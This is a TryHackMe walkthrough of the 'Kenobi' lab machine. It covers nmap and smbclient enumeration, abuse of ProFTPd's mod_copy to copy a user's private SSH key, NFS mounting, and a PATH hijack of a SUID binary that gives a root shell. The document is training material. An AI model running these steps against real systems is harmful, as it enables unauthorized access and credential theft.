---
title: Kenobi
desc: >-
  THM: Walkthrough on exploiting a Linux machine. Enumerate Samba for shares,
  manipulate a vulnerable version of proftpd and escalate your privileges with
  path variable manipulation.
---
## Recon/OSINT
Target IP: 10.10.88.133 ($IP)

## Enumeration

### Nmap Scan
Open ports:

![Nmap Open Ports](../../assets/images/thm/kenobi/nmap.png)

Samba enabled on ports 139 and 445.

![Nmap Samba](../../assets/images/thm/kenobi/nmap-samba.png)

Enumerate for Samba shares on port 445 using Nmap script.

```text
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
```
![Nmap Samba Shares](../../assets/images/thm/kenobi/nmap-samba-shares.png)

### SMBClient
Connect to `anonymous` share using `smbclient`. Supply an empty password.

```text
smbclient //$IP/anonymous
```
![Samba Anonymous Share](../../assets/images/thm/kenobi/samba-anonymous.png)

Download `log.txt` and examine content. Log file shows that an RSA private and public key pair is saved in `/home/kenobi/.ssh/id_rsa`.

### RPC
Enumerate port 111 (RPC service).

```text
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
```
![RPC Service Enumerate](../../assets/images/thm/kenobi/rpc-enumerate.png)

Found mount `/var`.

## Exploitation
Search `ExploitDB` or `searchsploit` for any exploits for `ProFTPd version 1.3.5`. 

![Searchsploit Search](../../assets/images/thm/kenobi/searchsploit.png)

Seems like `ProFTPd version 1.3.5` is vulnerable to remote command execution using `mod_copy module`.

!!! note

    The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
    

Copy Kenobi's private RSA key using: [SITE CPFR and SITE CPTO command](http://www.proftpd.org/docs/contrib/mod_copy.html).   

![RSA Key Copied to /var/tmp](../../assets/images/thm/kenobi/ftp-key-copy.png)

Mount `/var` to our local machine.

```text
sudo mkdir /mnt/kenobiNFS
```
```text
sudo mount $IP:/var /mnt/kenobiNFS
```
![KenobiNFS Directory Listing](../../assets/images/thm/kenobi/kenobiNFS-ls.png)

Navigate to `/tmp` directory and  use the Kenobi's `id_rsa` private key to login through `SSH`.

Setting file permissions on `/mnt/kenobiNFS` was giving trouble so copied the `id_rsa` to a local folder and set `chmod 600` permissions.

![SSH Login](../../assets/images/thm/kenobi/ssh-login.png)

User flag found!

![User Flag](../../assets/images/thm/kenobi/user-flag.png)

## Privilege Escalation
Search for system files with SUID bit set.

```text
find / -perm -u=s -type f 2>/dev/null
```
`Menu` binary looks suspicious.

![SUID Menu](../../assets/images/thm/kenobi/suid-menu.png)

Run the `menu` binary to see what it is.

![Menu Binary](../../assets/images/thm/kenobi/menu-binary.png)

Running `strings` on `/usr/bin/menu` shows that the binary is running without a full path for `curl`.

![No Full Path](../../assets/images/thm/kenobi/no-full-path.png)

We can manipulate the fact that this binary executes with root user privileges by manipulating our path to `curl` to gain a root shell.

```text
$ cd /tmp
$ echo /bin/sh > curl
$ chmod 777 curl
$ export PATH=/tmp:$PATH
```
Here, we echoed `/bin/sh` to a file named `curl`, assigned full permissions, and put its location in our path. This means that when `/usr/bin/menu` is run, it uses our temporary path to execute our modified "curl binary" which in turn executes `/bin/sh` with root privileges.

Execute the `menu` binary again to gain root privileges.

![Root Shell](../../assets/images/thm/kenobi/tmp-path-root.png)

Found root flag!

![Root Flag](../../assets/images/thm/kenobi/root-flag.png)
